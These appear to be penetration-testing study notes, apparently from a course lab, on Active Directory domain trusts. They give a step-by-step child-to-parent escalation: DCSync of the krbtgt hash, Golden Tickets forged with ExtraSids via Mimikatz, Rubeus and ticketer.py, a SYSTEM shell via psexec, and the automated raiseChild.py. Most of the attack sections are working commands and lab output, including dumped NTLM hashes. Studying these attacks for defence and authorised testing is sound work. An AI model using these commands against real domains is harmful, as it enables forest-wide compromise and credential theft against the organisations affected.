# 1- Domain Trusts Primer

Large organizations often set up **trusts** between domains to quickly integrate new companies, customers, MSPs, or other divisions without migrating all objects. While this simplifies access, it can also create **security risks**—a vulnerable subdomain or trusted partner could provide attackers with a path into the main domain.
## Domain Trusts Overview

A **trust** links two domains so users from one can access resources or manage systems in the other. Trusts can be **one-way** or **two-way(bidirectional)**, and organizations can set up different types depending on their needs.
- `Parent-child`: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain `corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice-versa.
- `Cross-link`: A trust between child domains to speed up authentication.
- `External`: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes [SID filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) or filters out authentication requests (by SID) not from the trusted domain.
- `Tree-root`: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
- `Forest`: A transitive trust between two forest root domains.
- [ESAE](https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.
![[Pasted image 20250831174625.png]]

**transitive trust/non-transitive:**
- A **transitive trust** means trust automatically extends to any other domains that a trusted domain also trusts. In a transitive relationship, if `Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.
 - In a **non-transitive trust**, the child domain itself is the only one trusted.

| Transitive                                                            | Non-Transitive                              |
| --------------------------------------------------------------------- | ------------------------------------------- |
| Shared, 1 to many                                                     | Direct trust                                |
| The trust is shared with anyone in the forest                         | Not extended to next level child domains    |
| Forest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups |

**Trusts can be set up in two directions: one-way or two-way (bidirectional):**
- `One-way trust`: Users in a `trusted` domain can access resources in a trusting domain, not vice-versa.
- `Bidirectional trust`: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between `INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`, users in `INLANEFREIGHT.LOCAL` would be able to access resources in `FREIGHTLOGISTICS.LOCAL`, and vice-versa.
>- **Trusted domain** = the domain whose users are **trusted**.
>- **Trusting domain** = the domain that is **trusting** the other domain.

Domain trusts, if misconfigured or unchecked, can create serious attack paths. Mergers and acquisitions often introduce bidirectional trusts that may expose an organization to risks from weaker, untested domains. Attackers can exploit these trusts—sometimes compromising a smaller, trusted domain to gain admin access to the main domain. Regular security reviews and careful planning are essential when setting up trust relationships.
## Enumerating Trust Relationships
#### Using Get-ADTrust
We can use the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.
```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
  # Source                  : DC=INLANEFREIGHT,DC=LOCAL
  # Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
  # IntraForest             : True
  # Direction               : BiDirectional
  
  # Source                  : DC=INLANEFREIGHT,DC=LOCAL
  # Target                  : FREIGHTLOGISTICS.LOCAL
  # ForestTransitive        : True
  # IntraForest             : False
  # Direction               : BiDirectional
```
[+] The domain **INLANEFREIGHT.LOCAL** has two trusts: one with its child domain **LOGISTICS.INLANEFREIGHT.LOCAL** and another forest trust with **FREIGHTLOGISTICS.LOCAL**. Both are **bidirectional**, allowing authentication in both directions. This is key during assessments since lack of authentication prevents enumeration or attacks across trusts.

#### Using PowerView - Checking for Existing Trusts
```powershell
Get-DomainTrust 

# or Using Get-DomainTrustMapping
Get-DomainTrustMapping
```
#### Using netdom 
The `netdom query` sub-command of the `netdom` command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.
```powershell
# query domain trust
netdom query /domain:<domain.local> trust

# query domain controllers
netdom query /domain:<domain.local> dc

# query workstations and servers
netdom query /domain:<domain.local> workstation
```
#### Using BloodHound
We can also use BloodHound to visualize these trust relationships by using the **Map Domain Trusts** in the **Analysis Tab** pre-built query. Here we can easily see that two bidirectional trusts exist.
![[Pasted image 20250831180821.png]]
# 2- Attacking Domain Trusts - Child -> Parent Trusts - from Windows

## SID History Primer
-  Used in **domain migrations** to let a migrated user keep access to old domain resources.
    - Stores **old SIDs** in the `sidHistory` attribute of a new account.
- **Abuse:**
    - Attackers use **Mimikatz** to **inject a Domain Admin SID** into the `sidHistory` of a child domain User we  control .
    - When that user logs in, their **access token** includes the **Domain Admin SID**, giving full privileges.
- **Impact:**
    - Become **Domain Admin** without touching the real account.
    - Can **DCSync**, forge **Golden Tickets**, forge **TGT** , and gain **long-term persistence**.

>**sidHistory:** attribute in AD user object
>**Extra SIDs:** field inside the TGT . in a forged ticket is like **pretending you have those SIDs in sidHistory** — it tricks every service into believing you belong to high-privilege groups, without touching the sidHistory 

This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the `SIDHistory` to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

## ExtraSids Attack

### 1- Obtaining the Child Domain KRBTGT Account's NT Hash using DCSync - Mimikatz

```powershell
.\mimikatz.exe
privilege::debug # interact with the dc as domain controller computer account 
lsadump::dcsync /user:<CHILD.DOMAIN-NetBIOSName>\krbtgt 

# CHILD.DOMAIN-NetBIOSName = "child" (for root domain child.domain.local), 
   # CHILD.DOMAIN-NetBIOSName = Get-ADDomain | Select-Object NetBIOSName

# When dealing with multiple domains 
lsadump::dcsync /user:<CHILD.DOMAIN-NetBIOSName>\krbtgt /domain:<CHILD.DOMAIN.LOCAL>
```
#### get the SID for the child domain
We can use the PowerView `Get-DomainSID` function to get the SID for the child domain, but this is also visible in the Mimikatz output above.
```powershell
 Get-DomainSID
```
####  obtain the SID for the Enterprise Admins group
Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet with a command such as `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.

```powershell
Get-DomainGroup -Domain <DOMAIN.LOCAL> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

At this point, we have gathered the following data points :
==example:==
- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`
#### Using ls to Confirm No Access
```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$ #=>  Access is denied
```
### 2.1 - ExtraSids Attack - Get Golden Ticket with  Mimikatz
Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.
#### Creating a Golden Ticket with Mimikatz
```powershell
mimikatz.exe
kerberos::golden /user:<hacker> /domain:<CHILD.DOMAIN.LOCAL> /sid:<CHILD-DOMAIN-SID> /krbtgt:<KRBTGT-LM-HASH> /sids:<Enterprise-Admins-group-SID> /ptt
```
#### Confirming a Kerberos Ticket is in Memory Using klist
We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.
```powershell
klist 

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
#         Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
```
#### Listing the Entire C: Drive of the Domain Controller
```powershell
ls \\<COMPUTER-dc01.DOMAIN.LOCAL>\c$ #=> access work !!
```

### 2.2 - ExtraSids Attack - Rubeus 
We can also perform this attack using Rubeus. First, again, we'll confirm that we cannot access the parent domain Domain Controller's file system.
#### Using ls to Confirm No Access Before Running Rubeus
```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$ #=>  Access is denied
```
#### Creating a Golden Ticket using Rubeus
Next, we will formulate our Rubeus command using the data we retrieved above. The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.

```powershell
 .\Rubeus.exe golden /rc4:<KRBTGT-LM-HASH> /domain:<CHILD.DOMIAN.LOCAL> /sid:<CHILD.DOMIAN.SID>  /sids:<Enterprise-Admins-group-SID> /user:<hacker> /ptt
```

#### Confirming the Ticket is in Memory Using klist
Once again, we can check that the ticket is in memory using the `klist` command.

```powershell
klist 

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
#         Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
```

## 3-  Performing a DCSync Attack

Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.
```powershell
.\mimikatz.exe
lsadump::dcsync /user:<DOMAIN>\<DOMAIN-ADMIN-USER> 
```
When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:
```powershell
.\mimikatz.exe
lsadump::dcsync /user:<DOMAIN>\<DOMAIN-ADMIN-USER> /domain:<DOMAIN.LOCAL>
```

# 3- Attacking Domain Trusts - Child -> Parent Trusts - from Linux

We can also perform the **ExtraSIDs**  attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain
## ExtraSids Attack

### Method 1 : manually 
####  Get  Child Domain KRBTGT  NT Hash using DCSync  with secretsdump.py
Once we have complete control of the child domain, `CHILD.DOMAIN.LOCAL`, we can use `secretsdump.py` to DCSync and grab the NTLM hash for the Child Domain KRBTGT account.
```bash 
secretsdump.py <CHILD.DOMAIN.LOCAL>/<CHILD_DC_USER>@<CHILD_DC_IP> -just-dc-user <CHILD-DOMAIN-NetBIOSName>/krbtgt
```
#### Looking for the Domain SID
 Next Performing SID Brute Forcing using lookupsid.py .  we can use [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format `DOMAIN_SID-RID`. For example, from the output below, we can see that the SID of the `lab_adm` user would be `S-1-5-21-2806153819-209893948-922872689-1001`.

```bash
lookupsid.py <CHILD.DOMAIN.LOCAL>/<CHILD-DC-USER>@<CHILD_DC_IP>
  # USERS/GROUPS RID +[ domain SID ]

# or to filter the doamin sid
lookupsid.py <CHILD.DOMAIN.LOCAL>/<CHILD-DC-USER>@<CHILD_DC_IP> | grep "Domain SID"
```
#### Grabbing the Parent Domain SID & Attaching to Enterprise Admin's RID
Next, we can rerun the command, targeting the ROOT  Domain Controller (DC01) at ROOT DC-IP and grab the domain SID S-1-5-21-xxxxxxxx-xxxxxxxxx-xxxxxxx and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs.

```bash
lookupsid.py <CHILD.DOMAIN.LOCAL>/<CHILD-DC-USER>@<DC_IP> | grep -B12 "Enterprise Admins"
```

We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user hacker to forge our Golden Ticket.
==example:==
-  The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
    - The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
    - The name of a target user in the child domain (does not need to exist!): hacker
    - The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
    - The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519
#### ExtraSids Attack - Constructing a Golden Ticket using ticketer.py

Next, we can use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).
```bash
ticketer.py -nthash <CHILD-DC-krbtgt-HASH> -domain <CHILD.DOMAIN.LOCAL> -domain-sid <CHILD-DOMAIN-SID> -extra-sid <Enterprise-Admins-group-SID> hacker
```
[+] ==The ticket will be saved down to our system as a credential **cache (ccache)** file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.==
#### Setting the KRB5CCNAME Environment Variable

```bash
export KRB5CCNAME=hacker.ccache 
```

#### Getting a SYSTEM shell using Impacket's psexec.py
We can check if we can successfully authenticate to the parent domain's Domain Controller using [Impacket's version of Psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.

```bash
psexec.py CHILD.Domain.LOCAL/hacker@<COMPUTER-(FQDN)-DC01>.<DOMAIN.LOCAL> -k -no-pass -target-ip <DC-IP>
#COMPUTER-DC01.DOMAIN.LOCAL → The FQDN (Fully Qualified Domain Name) of a machine
 #  C:\Windows\system32> whoami => nt authority\system
 # C:\Windows\system32> hostname => ACADEMY-EA-DC01
```

### Method 2 : autopwn
Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:

- Obtains the SID for the Enterprise Admins group of the parent domain
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain

Finally, if the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
#### Performing the Attack with raiseChild.py
```bash
raiseChild.py -target-exec <DC-IP> <CHILD.DOMAIN.LOCAL>/<CHILD-DC-USER>

# Password:
# [*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
# [*] Forest FQDN is: INLANEFREIGHT.LOCAL
# [*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
# [*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
# [*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
# LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
# LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
# [*] Getting credentials for INLANEFREIGHT.LOCAL
# INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
# INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
# [*] Target User account name is administrator
# INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
# INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
# [*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# [*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
# [*] Found writable share ADMIN$
# [*] Uploading file BnEGssCE.exe
# [*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
# [*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
# [*] Starting service UVNb.....
# [!] Press help for extra shell commands
# Microsoft Windows [Version 10.0.17763.107]
# (c) 2018 Microsoft Corporation. All rights reserved.
#
# C:\Windows\system32>whoami
# nt authority\system
```
The script lists out the workflow and process in a comment as follows:
```bash
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
```
> We don't want to tell the client that something broke because we used an "autopwn" script!